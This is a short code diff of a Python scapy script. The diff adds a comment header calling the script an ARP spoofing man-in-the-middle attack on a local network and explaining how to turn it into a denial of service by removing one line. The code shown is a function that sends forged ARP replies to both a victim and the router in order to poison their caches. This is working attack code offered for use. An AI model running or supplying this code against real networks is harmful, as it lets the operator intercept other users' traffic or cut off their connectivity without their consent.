@@ -1,7 +1,13 @@
 from scapy.all import *
 import os
 import time
-
+"""
+!--ARP SPOOFING BY LIAD ELIYAHU--!
+This is arp spoofing attack in the same LAN.
+MITM attack (forwarding).
+You can cause a DoS by not forwarding (redirecting) the packets.
+Just remove line 37. 
+"""
 def spoof(routerIP, victimIP, myHw):
 	send(ARP(op = 2, psrc = routerIP, pdst = victimIP, hwsrc=myHw))
 	send(ARP(op = 2, psrc = victimIP, pdst = routerIP, hwsrc=myHw))
